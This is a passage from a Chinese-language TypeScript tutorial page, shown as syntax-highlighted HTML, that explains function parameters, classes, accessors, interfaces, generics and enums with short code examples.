class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">x: <span class="built_in">number</span>, y: <span class="built_in">number</span></span>): <span class="built_in">number</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;;</span><br><span class="line">f.<span class="property">version</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//   (参数列表): 返回值</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">add</span>: &#123;</span><br><span class="line">  (<span class="attr">x</span>: <span class="built_in">number</span>, <span class="attr">y</span>: <span class="built_in">number</span>): <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">version</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125; = f;</span><br></pre></td></tr></table></figure><h3 id="3-5-2-可选参数-与-默认值"><a href="#3-5-2-可选参数-与-默认值" class="headerlink" title="3.5.2 可选参数 与 默认值"></a>3.5.2 可选参数 与 默认值</h3><p>TypeScript 在静态类型的同时允许参数可选、默认值（它们肯定不能同时使用）：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">myFunc</span>: <span class="function">(<span class="params">a: <span class="built_in">number</span>, b?: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">number</span>;</span><br><span class="line"></span><br><span class="line">myFunc = <span class="keyword">function</span> (<span class="params">x, y</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (y === <span class="literal">undefined</span>) &#123;    <span class="comment">// 用到可选参数时请判断</span></span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createPoint</span>(<span class="params">x: <span class="built_in">number</span> = <span class="number">0</span>, y: <span class="built_in">number</span> = <span class="number">0</span></span>): [<span class="built_in">number</span>, <span class="built_in">number</span>] &#123;</span><br><span class="line">  <span class="keyword">return</span> [x, y];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，传入 <code>undefined</code> 参数就能触发默认值（如果有的话）。</p><h3 id="3-5-3-参数解构-解包"><a href="#3-5-3-参数解构-解包" class="headerlink" title="3.5.3 参数解构 (解包)"></a>3.5.3 参数解构 (解包)</h3><p>JavaScript 原生支持参数解构。在 TypeScript 中则需要声明类型才能使用。</p><p>要解构的参数大多数情况下，要么是对象，要么是数组 / 元组，例如：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">[x, y]: [<span class="built_in">number</span>, <span class="built_in">number</span>]</span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">s</span>(<span class="params">&#123; a, b, c &#125;: &#123; a: <span class="built_in">number</span>; b: <span class="built_in">number</span>; c: <span class="built_in">number</span> &#125;</span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用方法请类比 “对象类型” 一节的解构赋值，也要注意两类语法的区别。</p><h3 id="3-5-4-剩余参数-args"><a href="#3-5-4-剩余参数-args" class="headerlink" title="3.5.4 剩余参数 (args)"></a>3.5.4 剩余参数 (args)</h3><p>使用之前在元组一节提到的 REST 运算符即可：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// rest 参数被包装成数组</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">joinNumbers</span>(<span class="params">...nums: <span class="built_in">number</span>[]</span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// rest 参数被包装成元组</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">...args: [<span class="built_in">boolean</span>, <span class="built_in">number</span>?]</span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 rest 参数被包装成元组，其中的元素也可以是可选参数。</p><h3 id="3-5-5-只读参数"><a href="#3-5-5-只读参数" class="headerlink" title="3.5.5 只读参数"></a>3.5.5 只读参数</h3><p>和 C++ 的 <code>const</code> 修饰参数一模一样。不多赘述：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">arraySum</span>(<span class="params">arr: <span class="keyword">readonly</span> <span class="built_in">number</span>[]</span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  arr[<span class="number">0</span>] = <span class="number">0</span>; <span class="comment">// 报错</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-5-6-函数重载"><a href="#3-5-6-函数重载" class="headerlink" title="3.5.6 函数重载"></a>3.5.6 函数重载</h3><p>TypeScript 因为有类型，所以支持了 JavaScript 所不支持的 重载。</p><p>使用方法很简单，要注意的点和其他静态类型语言一样（避免签名模糊等问题）。</p><p>不过 TypeScript 中，如果能用联合类型避免重载，就用联合类型。</p><h2 id="3-6-TypeScript-的类"><a href="#3-6-TypeScript-的类" class="headerlink" title="3.6 TypeScript 的类"></a>3.6 TypeScript 的类</h2><p>TypeScript 作为真正的静态类型语言，和 JavaScript 相比，最大的差异是引入了真正的开发者可定义的类。</p><h3 id="3-6-1-定义"><a href="#3-6-1-定义" class="headerlink" title="3.6.1 定义"></a>3.6.1 定义</h3><p>下面的示例概括了 TypeScript 类基本的使用方法：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TestClass</span> &#123;</span><br><span class="line">    <span class="attr">x</span>: <span class="built_in">number</span>;</span><br><span class="line">    <span class="attr">y</span>: <span class="built_in">number</span>;</span><br><span class="line">    <span class="attr">z</span>: <span class="built_in">string</span> = <span class="string">&quot;abc&quot;</span>;        <span class="comment">// 允许类内初始化</span></span><br><span class="line">    p!: <span class="built_in">number</span>;                <span class="comment">// ！修饰符告诉编译器该类型不为空，可以不在类内、构造函数内初始化</span></span><br><span class="line">    <span class="keyword">readonly</span> <span class="attr">q</span>: <span class="built_in">number</span>;        <span class="comment">// 和 Java 的 const 一样，仅允许初始化一次</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 类的构造函数名只能是 construtor，允许可选、默认参数</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">_x: <span class="built_in">number</span>, _y: <span class="built_in">number</span>, _q: <span class="built_in">number</span> = <span class="number">0</span></span>) &#123;</span><br><span class="line">        <span class="comment">// 类内的 this 对象就和其他面向对象的静态语言一样含义。具体含义见章末</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">x</span> = _x;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">y</span> = _y;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">q</span> = _q;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 类中的方法不需要 function 修饰。但方法一定需要定义在类内</span></span><br><span class="line">    <span class="comment">// 如果要定义在类外，就是在初始化为对象后再进行赋值了</span></span><br><span class="line">    <span class="title function_">add</span>(<span class="attr">a</span>: <span class="built_in">number</span>): <span class="built_in">number</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a + <span class="variable language_">this</span>.<span class="property">x</span> + <span class="variable language_">this</span>.<span class="property">y</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 类中的构造函数、其他方法都允许重载</span></span><br><span class="line">    <span class="title function_">add</span>(<span class="attr">r</span>: <span class="built_in">number</span>, <span class="attr">s</span>: <span class="built_in">number</span>, ...<span class="attr">args</span>: <span class="built_in">number</span>[]): <span class="built_in">number</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="attr">init</span>: <span class="built_in">number</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">x</span> + <span class="variable language_">this</span>.<span class="property">y</span> + r + s + args.<span class="title function_">reduce</span>(<span class="function">(<span class="params">acc, cur</span>) =&gt;</span> acc + cur, init);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-6-2-类的可见性修饰符"><a href="#3-6-2-类的可见性修饰符" class="headerlink" title="3.6.2 类的可见性修饰符"></a>3.6.2 类的可见性修饰符</h3><p>TypeScript 的类更像 C++ 的结构体，<strong>不加可见性修饰符，默认 <code>public</code></strong>。</p><p>使用方法同其他面向对象的静态类型语言，略。</p><h3 id="3-6-3-类的访问器"><a href="#3-6-3-类的访问器" class="headerlink" title="3.6.3 类的访问器"></a>3.6.3 类的访问器</h3><p>如果你学过 Python，那么恭喜，TypeScript 的访问器 <code>set</code>、<code>get</code> 可以<strong>完全按照</strong> Python 的装饰器 <code>@setter</code>、<code>@getter</code> 理解。</p><p>定义方法如下：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">T</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> _name!: <span class="built_in">string</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 访问器前加入 get / set 关键字</span></span><br><span class="line">    <span class="comment">// 访问器的名字必须与要定义的属性名相同</span></span><br><span class="line">    <span class="keyword">get</span> <span class="title function_">name</span>(): <span class="built_in">string</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">_name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">set</span> <span class="title function_">name</span>(<span class="params">value: <span class="built_in">string</span> | <span class="built_in">number</span></span>): <span class="built_in">void</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_name</span> = <span class="title class_">String</span>(value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类外访问，直接当作普通属性使用，但会调用 get 实时计算</span></span><br><span class="line"><span class="keyword">var</span> <span class="attr">test</span>: T = <span class="keyword">new</span> T;</span><br><span class="line">test.<span class="property">name</span> = <span class="string">&quot;Hello&quot;</span>;    <span class="comment">// 调用了 set 访问器</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(test.<span class="property">name</span>);    <span class="comment">// 调用了 get 访问器</span></span><br></pre></td></tr></table></figure><p>根据它们的用途，可以很显然地知道：</p><ul><li><code>get</code> 访问器不能有参数；</li><li>如果一个属性不存在 <code>set</code> 访问器，那么这个参数只读，等价于被 <code>readonly</code> 修饰；</li></ul><h3 id="3-6-4-类的静态成员"><a href="#3-6-4-类的静态成员" class="headerlink" title="3.6.4 类的静态成员"></a>3.6.4 类的静态成员</h3><p>和 Java、C++ 一样，使用 <code>static</code> 关键字修饰静态变量。</p><p>但是！和其他语言不太一样，TypeScript 的静态成员（属性和方法）不能由实例调用，只能由类名调用：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">  <span class="keyword">static</span> x = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">printX</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">MyClass</span>.<span class="property">x</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="attr">t</span>: <span class="title class_">MyClass</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>;</span><br><span class="line">t.<span class="title function_">printX</span>();    <span class="comment">// TypeError</span></span><br><span class="line">t.<span class="property">x</span>;        <span class="comment">// TypeError</span></span><br><span class="line"><span class="title class_">MyClass</span>.<span class="title function_">printX</span>();    <span class="comment">// Correct</span></span><br><span class="line"><span class="title class_">MyClass</span>.<span class="property">x</span>;            <span class="comment">// Correct</span></span><br></pre></td></tr></table></figure><h3 id="3-6-5-类的继承"><a href="#3-6-5-类的继承" class="headerlink" title="3.6.5 类的继承"></a>3.6.5 类的继承</h3><p>和 Java 一样，TypeScript 使用 <code>extend</code> 关键字进行类的继承。</p><p>还是和 Java 一样，TypeScript 也有 <code>super</code> 关键字，可以 <strong>用来调用父类构造函数、调用父类中已被重写的方法等等</strong>。</p><p>类继承时，不同可见性修饰符下对应数据域的继承原则与 Java、C++ 类似，但是有差别：</p><ul><li><p>父类 protected 的数据成员，子类 <strong>可以转为 public，但不能转为 private</strong>；</p></li><li><p>子类可以定义与父类同名不同类型的属性，但是如果希望它们的赋值关联，则需要 <code>declare</code> 关键字修饰；</p></li></ul><h3 id="3-6-6-抽象类"><a href="#3-6-6-抽象类" class="headerlink" title="3.6.6 抽象类"></a>3.6.6 抽象类</h3><p>和 C++ / Java 一样，TypeScript 中的抽象类关键字也是 <code>abstract</code>、也不允许实例化、不允许 <code>private</code> 修饰、抽象成员不允许有实现。</p><p>同时，TypeScript 允许使用 <code>abstract</code> 修饰抽象类的<strong>数据成员（Java 和 C++ 做不到）</strong>、成员函数，强制要求子类（非抽象类）实现。</p><p>值得注意的是，<strong>一个类最多只能继承于一个抽象类（再多就应该用接口 interface 了）</strong>。</p><h3 id="3-6-7-FAQ-类中的-this-在-TypeScript-里究竟是什么"><a href="#3-6-7-FAQ-类中的-this-在-TypeScript-里究竟是什么" class="headerlink" title="3.6.7 FAQ: 类中的 this 在 TypeScript 里究竟是什么"></a>3.6.7 FAQ: 类中的 <code>this</code> 在 TypeScript 里究竟是什么</h3><p>我们知道，在 JavaScript 中，<code>this</code> 含义丰富：</p><ul><li><p>在方法中，this 表示该方法所属的对象；</p></li><li><p>如果单独使用，this 表示全局对象；</p></li><li><p>在函数中，this 表示全局对象（严格模式下为 <code>undefined</code>）；</p></li></ul><p>那么在 TypeScript 的类中，含义就和其他面向对象语言类似，是指 “该方法所在类的当前对象”。</p><p>实际上，这里还有几个问题没有解决：</p><ol><li>在 JavaScript 中允许定义一个原型，充当面向对象编程的工具。它允许将一个对象的方法赋给另一个变量，<strong>赋予后，<code>this</code> 将跟随新的变量脱离原来的作用域</strong>。在 TypeScript 中，这种行为是怎样的？</li><li>如果在 JavaScript 的原型中使用闭包/箭头函数，那么在其中的 <code>this</code> 将不再指代当前对象，除非手动传递 <code>this</code> 的值。在 TypeScript 中的行为是怎样的？</li></ol><p>针对第一个问题，TypeScript 为了防止改变函数语义（本来的 <code>this</code> 是类中对象，如果将函数赋给其他变量后 <code>this</code> 就成为了新变量作用域中的 <code>this</code>），<strong>允许类中方法第一参数声明 <code>this</code> 类型（就像 Python 的 <code>self</code>）</strong>：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> tt = <span class="string">&quot;Test&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">test</span>(<span class="attr">this</span>: <span class="title class_">Test</span>): <span class="built_in">string</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">tt</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>无论在哪里，只要 typescript 检测到第一个参数是 this，就会自动将当前环境 this 填充进去，并且不会在 JavaScript 中展现出来。</p></blockquote><p>这样，如果赋给其他变量后，一旦涉及改变了 <code>this</code> 的函数调用，编译器会指出错误：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> b = <span class="title class_">Test</span>.<span class="property">test</span>;</span><br><span class="line"></span><br><span class="line">b.();    <span class="comment">// TypeError, 因为此时的 this 是全局对象</span></span><br></pre></td></tr></table></figure><blockquote><p>该参数可以省略（但省略后会回到 JavaScript 的行为）。</p></blockquote><p>当然，你可以在构造函数中，使用 JavaScript 原生方法 <code>bind</code> 将方法与类的 <code>this</code> 环境绑定，这样无论怎么赋值，都是那个对象对应的方法了 —— 这也是最稳妥的做法。</p><p>对第二个问题，TypeScript 也需要担心语义问题，因此如果你打开了 <code>noImplicitThis</code> 编译选项，那么 TypeScript 编译器会直接报错。否则其行为和 JavaScript 一致。</p><hr><p>最后补充一个 TypeScript 的小特性：</p><p>TypeScript 中的类能作为类型使用，例如：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span> &#123;</span><br><span class="line">  <span class="attr">contents</span>: <span class="built_in">string</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">set</span>(<span class="attr">value</span>: <span class="built_in">string</span>): <span class="variable language_">this</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">contents</span> = value;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-7-TypeScript-的接口"><a href="#3-7-TypeScript-的接口" class="headerlink" title="3.7 TypeScript 的接口"></a>3.7 TypeScript 的接口</h2><h3 id="3-7-1-定义和使用"><a href="#3-7-1-定义和使用" class="headerlink" title="3.7.1 定义和使用"></a>3.7.1 定义和使用</h3><p>TypeScript 的接口和 Java 非常类似：接口和抽象类一样抽象，<strong>方法全是抽象方法（不能有实现）</strong>、可省略所有的 <code>abstract</code> 关键字。但是属性不是常量属性（只读）而是抽象属性（不允许赋值），因为在 TypeScript 中 <code>abstract</code> 可以修饰数据成员。</p><p>如下由于接口算是个抽象类，因此接口间可以继承，和 Java 的接口继承一样，要注意冲突问题。</p><p>此外，接口还可以继承于 <code>type</code>（类型别名，它和接口的区别是什么？接下来再讨论）。</p><p>甚至接口还能继承于普通的 <code>class</code>。此时 <code>class</code> 中所有的属性、方法全部保持类型，变成对应的抽象属性、抽象方法。<strong>这里我们可以知道，被接口继承的类不能有 <code>private</code>/<code>protected</code> 修饰的成员，因为这样会导致 “无法实现的抽象成员” 的出现</strong>。</p><h3 id="3-7-2-接口合并"><a href="#3-7-2-接口合并" class="headerlink" title="3.7.2 接口合并"></a>3.7.2 接口合并</h3><p>这只是个特性，并不希望你为了使用它而使用，只是在必须的时候才使用。因为这样会降低你的代码可读性。</p><ul><li><p>情况 1：如果你重复定义了接口，那么这两次定义的内容会合并：</p><ul><li>同名函数 -&gt; 重载，同名属性 -&gt; 联合类型，不同名的直接并列；</li><li><strong>如果有不能联合/重载的部分</strong>，编译器会抛出错误；</li></ul></li><li><p>情况 2：如果你对某几个不同名的接口使用了类型联合运算符，如下：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="keyword">const</span> <span class="attr">s</span>: <span class="title class_">Inter1</span> | <span class="title class_">Inter2</span>;</span><br></pre></td></tr></table></figure><p>这就相当于显示将不同名的接口合并为一个接口 <code>s</code>，合并规则和同名接口合并相同；</p></li></ul><h3 id="3-7-3-接口-Interface-和类型别名-type-的异同"><a href="#3-7-3-接口-Interface-和类型别名-type-的异同" class="headerlink" title="3.7.3 接口 (Interface) 和类型别名 (type) 的异同"></a>3.7.3 接口 (Interface) 和类型别名 (type) 的异同</h3><p>相同点：都能创建一个类型、定义方式极其类似。</p><p>不同点：</p><ul><li><code>type</code> 可以定义非对象类型，而 <code>interface</code> 只能定义对象类型；</li><li><p><code>interface</code> <strong>可以继承、合并</strong>，而 <code>type</code> 不行，重复定义同名 <code>type</code> 会报错；</p></li><li><p><code>type</code> 内部不能使用 <code>this</code> 指代当前对象，<code>interface</code> 则可以；</p></li></ul><p>总结：除去一些复杂的类型运算，其他情况优先使用 <code>interface</code>；</p><h2 id="3-8-TypeScript-的泛型"><a href="#3-8-TypeScript-的泛型" class="headerlink" title="3.8 TypeScript 的泛型"></a>3.8 TypeScript 的泛型</h2><p>TypeScript 的泛型定义、使用方法与 Java 相同，可以用在类、函数、接口、类型别名、对象上，并且<strong>可以指定默认类型</strong>，如下：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>&lt;<span class="title class_">NumType</span> = <span class="built_in">number</span>&gt; &#123;</span><br><span class="line">  value!: <span class="title class_">NumType</span>;</span><br><span class="line">  add!: <span class="function">(<span class="params">x: NumType, y: NumType</span>) =&gt;</span> <span class="title class_">NumType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> <span class="title function_">C</span>();</span><br><span class="line"></span><br><span class="line">foo.<span class="property">value</span> = <span class="number">0</span>;</span><br><span class="line">foo.<span class="property">add</span> = <span class="keyword">function</span> (<span class="params">x, y</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>TypeScript 中，<strong>泛型的另一种常用方式是：作为类型参数的约束条件</strong>。</p><p>如下：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> comp&lt;T <span class="keyword">extends</span> &#123; <span class="attr">length</span>: <span class="built_in">number</span> &#125;&gt;(<span class="attr">a</span>: T, <span class="attr">b</span>: T) &#123;</span><br><span class="line">  <span class="keyword">if</span> (a.<span class="property">length</span> &gt;= b.<span class="property">length</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样约束了 <strong>传入的类型必须是具有 <code>length: number</code> 字段的对象</strong>，减少了代码犯错的概率。</p><p>我们可以总结为：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">TypeParam</span> <span class="keyword">extends</span> <span class="title class_">ConstraintType</span>&gt;</span><br></pre></td></tr></table></figure><p>表示类型参数必须是 <code>ConstraintType</code> 的子类型。</p><p>不过为了代码可读性，还是提出以下建议：</p><ul><li>尽量少用泛型：降低了代码可读性；</li><li>泛型的类型参数越少越好；</li></ul><h2 id="3-9-TypeScript-Enum-类型"><a href="#3-9-TypeScript-Enum-类型" class="headerlink" title="3.9 TypeScript Enum 类型"></a>3.9 TypeScript Enum 类型</h2><h3 id="3-9-1-定义与使用"><a href="#3-9-1-定义与使用" class="headerlink" title="3.9.1 定义与使用"></a>3.9.1 定义与使用</h3><p>和其他大多数静态语言一样，TypeScript 也有枚举类型。它的枚举类型更像 C++ 11 的 <code>enum Class</code>，定义如下：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Color</span> &#123;</span><br><span class="line">    <span class="title class_">Red</span>,</span><br><span class="line">    <span class="title class_">Green</span>,</span><br><span class="line">    <span class="title class_">Blue</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>值从 0 递增，但值不重要；</li><li>是个类型也是值（变量不能和枚举类型同名），因此可以 <code>Color.Red</code> 这样调用，增强代码可读性；</li><li>枚举值只读，可以是自身类型（<code>Color</code>）也可以是 <code>number</code>（因此枚举类型做参数时，传入一切 <code>number</code> 都不报错）；</li></ul><p>通常建议枚举类型前加 <code>const</code> 修饰，这样可以帮助编译器优化代码，提升性能：<code>const enum</code>；</p><h3 id="3-9-2-特性"><a href="#3-9-2-特性" class="headerlink" title="3.9.2 特性"></a>3.9.2 特性</h3><ul><li><p>同名枚举类型会像同名接口的行为一样合并；</p></li><li><p>允许字符串做枚举类型的值，要设置，则全员都设置，例如：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">enum</span> <span class="title class_">MediaTypes</span> &#123;</span><br><span class="line">    <span class="title class_">JSON</span> = <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">    <span class="variable constant_">XML</span> = <span class="string">&quot;application/xml&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> url = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">fetch</span>(url, &#123;</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="title class_">Accept</span>: <span class="title class_">MediaTypes</span>.<span class="property">JSON</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>字符串枚举可以由联合类型代表：<code>function move(where: &quot;Up&quot; | &quot;Down&quot; | &quot;Left&quot; | &quot;Right&quot;);</code></p></li><li><p>在 C++ 的枚举类型中，有很多人抱怨不方便通过枚举值打印出枚举成员的字符串名。在 TypeScript 中就有方法：<strong>反向映射</strong>，我们调用 <code>EnumClass[n]</code> 就能得到索引为 <code>n</code> 的枚举成员的字符串名。</p><blockquote><p>这与 TypeScript 编译器将 <code>enum</code> 翻译成 JavaScript 的方式有关：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"> <span class="title class_">Apple</span>,</span><br><span class="line"> <span class="title class_">Banana</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会被编译为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 